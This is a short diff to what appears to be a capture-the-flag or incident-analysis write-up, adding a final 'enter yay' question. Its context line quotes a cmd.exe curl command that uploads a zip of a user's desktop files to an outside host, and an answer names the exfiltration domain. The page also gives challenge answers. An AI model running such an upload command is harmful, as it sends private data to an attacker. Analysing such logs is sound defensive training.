@@ -284,3 +284,7 @@ cmd.exe /c curl -F "file=@C:\Users\andavis\Desktop\important_network_info.zip" h
 <br>
 
 **Answer: nothing-to-see-here.net**<br><br>
+
+**Q27. You did an amazing job! Enter yay to finish**<br><br>
+
+**Answer: yay**<br><br>
